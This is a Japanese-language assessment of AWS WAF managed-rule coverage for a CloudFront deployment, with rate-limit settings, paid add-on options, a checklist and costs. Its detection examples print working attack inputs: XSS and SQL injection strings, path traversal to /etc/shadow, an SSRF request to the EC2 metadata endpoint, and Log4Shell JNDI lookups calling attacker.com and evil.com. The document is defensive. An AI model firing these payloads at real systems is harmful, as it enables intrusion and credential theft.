# CloudFront + WAF環境におけるL7攻撃保護状況 - AWS Managed Rules詳細分析

**作成日**: 2026-01-08
**対象環境**: CloudFront + AWS WAF + S3/API Gateway

---

## 📋 目次
1. [エグゼクティブサマリー](#エグゼクティブサマリー)
2. [保護状況マトリクス](#保護状況マトリクス)
3. [既存保護の詳細](#既存保護の詳細)
4. [追加設定が必要な機能](#追加設定が必要な機能)
5. [実装チェックリスト](#実装チェックリスト)
6. [参照リンク](#参照リンク)

---

## エグゼクティブサマリー

### 🎯 結論
**CloudFront + WAFの基本構成で、OWASP Top 10の主要脆弱性は既に保護されています**

### ✅ 既に保護済み（AWS Managed Rules有効化時）
- **SQL Injection** - 完全自動検知・ブロック
- **Cross-Site Scripting (XSS)** - 完全自動検知・ブロック
- **Local/Remote File Inclusion (LFI/RFI)** - 完全自動検知・ブロック
- **Path Traversal** - 完全自動検知・ブロック
- **Server-Side Request Forgery (SSRF)** - EC2メタデータ保護
- **Remote Code Execution (RCE)** - Log4j, Java Deserialization保護
- **サイズ制限超過攻撃** - Query, Cookie, Body, URIサイズ制限
- **既知の悪意あるボット** - User-Agent検知

### ⚠️ 別途対策が必要
- **Layer 7 DDoS攻撃** - Rate-based Rulesによる手動設定が必要
- **高度なボット攻撃** - Bot Control (有料機能、$10/月〜)
- **不正ログイン試行 (Credential Stuffing)** - ATP (有料機能、$10/月〜)
- **アカウント作成詐欺** - ACFP (有料機能、$10/月〜)

---

## 保護状況マトリクス

| 攻撃タイプ | 保護状況 | 使用ルール | WCU消費 | 設定要否 |
|----------|---------|-----------|---------|----------|
| **SQL Injection** | ✅ 自動保護 | SQL Database Rule Group | 200 | Managed Rules有効化のみ |
| **XSS (Cross-Site Scripting)** | ✅ 自動保護 | Core Rule Set (CRS) | 700 | Managed Rules有効化のみ |
| **LFI (Local File Inclusion)** | ✅ 自動保護 | Core Rule Set (CRS) | 700 | Managed Rules有効化のみ |
| **RFI (Remote File Inclusion)** | ✅ 自動保護 | Core Rule Set (CRS) | 700 | Managed Rules有効化のみ |
| **Path Traversal** | ✅ 自動保護 | Core Rule Set (CRS) | 700 | Managed Rules有効化のみ |
| **SSRF (EC2 Metadata)** | ✅ 自動保護 | Core Rule Set (CRS) | 700 | Managed Rules有効化のみ |
| **Log4j RCE** | ✅ 自動保護 | Known Bad Inputs | 200 | Managed Rules有効化のみ |
| **Java Deserialization RCE** | ✅ 自動保護 | Known Bad Inputs | 200 | Managed Rules有効化のみ |
| **管理画面アクセス** | ✅ 自動保護 | Admin Protection | 100 | Managed Rules有効化のみ |
| **Layer 7 DDoS** | ⚠️ 手動設定 | Rate-based Rules | 2〜 | **カスタムルール作成必要** |
| **高度なボット** | ❌ 有料機能 | Bot Control | 50+ | **有料追加 ($10/月〜)** |
| **不正ログイン** | ❌ 有料機能 | ATP | 50+ | **有料追加 ($10/月〜)** |
| **アカウント詐欺** | ❌ 有料機能 | ACFP | 50+ | **有料追加 ($10/月〜)** |

### 📊 WCU (Web ACL Capacity Units) 合計
- **基本保護 (無料)**: 1,200 WCU (CRS 700 + SQL 200 + Known Bad 200 + Admin 100)
- **デフォルト上限**: 1,500 WCU（リクエストで5,000まで拡張可能）
- **残り容量**: 300 WCU（Rate-based Rules等のカスタムルール用）

---

## 既存保護の詳細

### 1. Core Rule Set (CRS) - 700 WCU

**目的**: OWASP Top 10の基本的な脆弱性を包括的に保護

#### 📌 主要保護ルール

| ルール名 | 検査対象 | 保護内容 |
|---------|---------|---------|
| `NoUserAgent_HEADER` | Header | User-Agentヘッダ欠落リクエストをブロック |
| `UserAgent_BadBots_HEADER` | Header | 既知の悪意あるボットのUser-Agentを検知 |
| `SizeRestrictions_*` | Query/Cookie/Body/URI | 異常なサイズのリクエストをブロック |
| `EC2MetaDataSSRF_*` | Body/Cookie/URI/Query | EC2メタデータへのSSRF攻撃を防止 |
| `GenericLFI_*` | Query/URI/Body | `../../` 等のパストラバーサル検知 |
| `RestrictedExtensions_*` | URI/Query | `.bak`, `.config`, `.log` 等の機密ファイルアクセス防止 |
| `GenericRFI_*` | Query/Body/URI | `http://`, `ftp://` 等の外部ファイル読み込み検知 |
| `CrossSiteScripting_*` | Cookie/Query/Body/URI | `<script>`, `javascript:` 等のXSSパターン検知 |

#### 🔍 具体的な防御例

**XSS攻撃の検知**:
```http
# ブロックされるリクエスト例
GET /search?q=<script>alert('XSS')</script>
Cookie: session=<img src=x onerror=alert(1)>
```

**Path Traversal攻撃の検知**:
```http
# ブロックされるリクエスト例
GET /../../etc/passwd
POST /upload?file=../../../../etc/shadow
```

**SSRF攻撃の検知**:
```http
# ブロックされるリクエスト例
POST /api/fetch?url=http://169.254.169.254/latest/meta-data/
```

---

### 2. SQL Database Rule Group - 200 WCU

**目的**: SQL Injection攻撃の包括的な防御

#### 📌 主要保護ルール

| ルール名 | 検査対象 | 感度レベル |
|---------|---------|-----------|
| `SQLi_QUERYARGUMENTS` | Query Parameters | Low (誤検知率低) |
| `SQLiExtendedPatterns_QUERYARGUMENTS` | Query Parameters | Extended (高度パターン) |
| `SQLi_BODY` | Request Body | Low (誤検知率低) |
| `SQLiExtendedPatterns_BODY` | Request Body | Extended (高度パターン) |
| `SQLi_COOKIE` | Cookie | Standard |

#### 🔍 検知されるSQLiパターン例

```http
# ブロックされるリクエスト例
GET /search?id=1' OR '1'='1
POST /login
Content-Type: application/json
{"username": "admin' --", "password": "anything"}

GET /product?name=laptop'; DROP TABLE users; --
```

**保護範囲**:
- Classic SQL Injection (`' OR 1=1 --`)
- Union-based SQLi (`UNION SELECT`)
- Time-based Blind SQLi (`SLEEP(5)`)
- Boolean-based Blind SQLi
- Stacked Queries (`; DROP TABLE`)

---

### 3. Known Bad Inputs - 200 WCU

**目的**: 既知の重大な脆弱性エクスプロイトを防御

#### 📌 主要保護ルール

| ルール名 | 保護対象 | 検査対象 |
|---------|---------|---------|
| `Log4JRCE` | Log4Shell (CVE-2021-44228等) | Header/Body/URI/Query |
| `JavaDeserializationRCE` | Java Deserialization攻撃 | Header/Body/URI/Query |
| `Host_localhost_HEADER` | Localhostへの不正アクセス | Host Header |
| `PROPFIND_METHOD` | WebDAV PROPFIND攻撃 | HTTP Method |
| `ExploitablePaths_URIPATH` | 既知の脆弱なパス | URI Path |

#### 🔍 具体的な防御例

**Log4j RCE攻撃の検知**:
```http
# ブロックされるリクエスト例
GET /api/search?query=${jndi:ldap://attacker.com/exploit}
User-Agent: ${jndi:ldap://evil.com/a}
X-Api-Version: ${jndi:dns://attacker.com}
```

**Java Deserialization攻撃の検知**:
```http
# ブロックされるシリアライズデータパターン
Content-Type: application/x-java-serialized-object
[バイナリデータにSerializableパターン検知]
```

---

### 4. Admin Protection - 100 WCU

**目的**: 管理画面・管理機能への不正アクセス防止

#### 📌 保護される一般的な管理パス

```
/admin/*
/administrator/*
/wp-admin/*
/phpmyadmin/*
/manager/*
/console/*
```

**動作**: 管理パスへのアクセスを検知し、IP制限や認証強化を推奨

---

## 追加設定が必要な機能

### 1. Layer 7 DDoS対策 - Rate-based Rules

**現状**: CloudFront + WAFの基本構成では**手動設定が必要**

#### 推奨設定例

| ルール名 | レート制限 | 対象 | WCU |
|---------|-----------|------|-----|
| `RateLimit-Global` | 2,000 req/5分/IP | 全体 | 2 |
| `RateLimit-Login` | 10 req/5分/IP | `/login`, `/api/auth` | 2 |
| `RateLimit-API` | 100 req/5分/IP | `/api/*` | 2 |
| `RateLimit-Search` | 50 req/5分/IP | `/search` | 2 |

**実装方法**:
```json
{
  "Name": "RateLimit-Login",
  "Priority": 10,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 10,
      "AggregateKeyType": "IP"
    }
  },
  "Action": {
    "Block": {}
  }
}
```

**コスト**: 無料（WCUのみ消費、1ルール = 2 WCU）

---

### 2. 高度なボット対策 - AWS WAF Bot Control

**現状**: 基本のManaged Rulesには含まれない**有料オプション**

#### 機能と料金

| 機能 | 保護範囲 | 月額料金 | リクエスト課金 | WCU |
|-----|---------|---------|---------------|-----|
| **Bot Control** | スクレイピング、偽装ブラウザ、ボットネット | $10 | $1/100万リクエスト | 50+ |
| **Targeted Protection** | 高度な回避技術ボット | $10追加 | $1/100万リクエスト追加 | 追加50+ |

**検知されるボット例**:
- Headless Browser (Puppeteer, Selenium)
- Automated Testing Tools
- Web Scrapers (Beautiful Soup, Scrapy)
- Search Engine Crawlers (良性・悪性を識別)
- HTTP Libraries (Requests, cURL without proper headers)

**導入判断基準**:
- スクレイピング被害がある場合: **推奨**
- APIエンドポイントがある場合: **検討**
- 静的コンテンツのみ: 不要

---

### 3. 不正ログイン対策 - Account Takeover Prevention (ATP)

**現状**: 基本のManaged Rulesには含まれない**有料オプション**

#### 機能と料金

| 機能 | 保護範囲 | 月額料金 | リクエスト課金 | WCU |
|-----|---------|---------|---------|-----|
| **ATP** | Credential Stuffing, Brute Force | $10 | $1/100万リクエスト | 50+ |

**保護されるシナリオ**:
- **Credential Stuffing**: 漏洩認証情報リストを使った一斉ログイン試行
- **Brute Force攻撃**: パスワード総当たり攻撃
- **分散ログイン試行**: 複数IPからの協調攻撃

**動作方式**:
1. ログインエンドポイントを監視
2. 異常なログイン試行パターンを機械学習で検知
3. 疑わしいリクエストに対してCAPTCHA挿入またはブロック

**導入判断基準**:
- ユーザ認証機能がある場合: **推奨**
- 高価値アカウント（金融、ECサイト）: **必須級**
- 認証機能なし（静的サイト）: 不要

---

### 4. アカウント作成詐欺対策 - Account Creation Fraud Prevention (ACFP)

**現状**: 基本のManaged Rulesには含まれない**有料オプション**

#### 機能と料金

| 機能 | 保護範囲 | 月額料金 | リクエスト課金 | WCU |
|-----|---------|---------|---------|-----|
| **ACFP** | 偽アカウント作成、スパムアカウント | $10 | $1/100万リクエスト | 50+ |

**保護されるシナリオ**:
- **ボットによる大量アカウント作成**
- **使い捨てメールアドレスでのスパム登録**
- **プロモーション悪用**（複数アカウントで特典重複取得）

**導入判断基準**:
- ユーザ登録機能がある場合: **検討**
- プロモーション・キャンペーン実施時: **推奨**
- サインアップボーナスがある場合: **必須級**
- ユーザ登録機能なし: 不要

---

## 実装チェックリスト

### ✅ 即座に確認すべき項目

- [ ] **AWS Managed Rules有効化確認**
  ```bash
  # Web ACL設定で以下が有効か確認
  - AWSManagedRulesCommonRuleSet (CRS)
  - AWSManagedRulesSQLiRuleSet
  - AWSManagedRulesKnownBadInputsRuleSet
  - AWSManagedRulesAdminProtectionRuleSet (管理画面がある場合)
  ```

- [ ] **CloudWatch Logs有効化**
  ```bash
  # WAF Web ACLのログを有効化し、検知状況を可視化
  aws wafv2 put-logging-configuration \
    --logging-configuration ResourceArn=<WebACL-ARN>,LogDestinationConfigs=<CloudWatch-LogGroup>
  ```

- [ ] **ブロック vs カウントモード確認**
  - 初期はCountモードで誤検知率を確認
  - 2週間〜1ヶ月の検証期間後にBlockモードへ移行

### 🛠️ 推奨実装（優先度順）

#### 優先度1: 必須設定（今すぐ）

1. **Rate-based Rules設定**
   - [ ] 全体レート制限: 2,000 req/5分/IP
   - [ ] ログインエンドポイント: 10 req/5分/IP
   - [ ] APIエンドポイント: 100 req/5分/IP

2. **CloudWatch Logsアラート設定**
   - [ ] ブロック率が通常の10倍を超えた場合にSNS通知
   - [ ] 特定IPから100回以上ブロックされた場合にSlack通知

#### 優先度2: ビジネス要件に応じて（1ヶ月以内）

3. **Bot Control導入検討**
   - スクレイピング被害がある場合
   - APIエンドポイントを保護する場合

4. **ATP (Account Takeover Prevention) 導入検討**
   - ユーザ認証機能がある場合
   - 過去に不正ログイン被害がある場合

5. **ACFP (Account Creation Fraud Prevention) 導入検討**
   - ユーザ登録機能がある場合
   - プロモーション・キャンペーン実施時

#### 優先度3: 継続的改善（3ヶ月以内）

6. **カスタムルール作成**
   - アプリケーション固有の攻撃パターン対策
   - 地理的制限（必要な場合）
   - IP制限（管理機能へのアクセス等）

7. **定期的なルール見直し**
   - 月次でCloudWatch Logsを分析
   - 誤検知が多いルールのチューニング
   - 新しい攻撃パターンへの対応

---

## コスト概算

### 基本保護（無料 - Managed Rulesのみ）

| 項目 | 月額料金 |
|-----|---------|
| Web ACL | $5.00 |
| Managed Rules (CRS + SQLi + Known Bad + Admin) | $0 (AWSが無料提供) |
| リクエスト課金 (100万req想定) | $0.60 |
| **合計** | **$5.60/月** |

### フル保護（Bot Control + ATP + ACFP追加）

| 項目 | 月額料金 |
|-----|---------|
| Web ACL | $5.00 |
| Managed Rules | $0 |
| Bot Control | $10.00 |
| ATP (不正ログイン対策) | $10.00 |
| ACFP (アカウント作成詐欺対策) | $10.00 |
| リクエスト課金 (100万req × $4) | $4.00 |
| **合計** | **$39.00/月** |

---

## 参照リンク

### AWS公式ドキュメント

1. **WAF Managed Rules**
   - [Baseline Rule Groups](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-baseline.html)
   - [Use-case Specific Rule Groups](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-use-case.html)

2. **DDoS対応**
   - [Responding to DDoS Attacks - Manual Mitigation](https://docs.aws.amazon.com/waf/latest/developerguide/ddos-responding-manual.html)
   - [Application Layer Attacks Best Practices](https://docs.aws.amazon.com/whitepapers/latest/aws-best-practices-ddos-resiliency/application-layer-attacks.html)

3. **Bot Control**
   - [AWS WAF Bot Control](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-bot.html)

4. **ATP & ACFP**
   - [Account Takeover Prevention](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-atp.html)
   - [Account Creation Fraud Prevention](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-acfp.html)

---

**最終更新**: 2026-01-08
**次回レビュー推奨日**: 2026-02-08 (1ヶ月後)
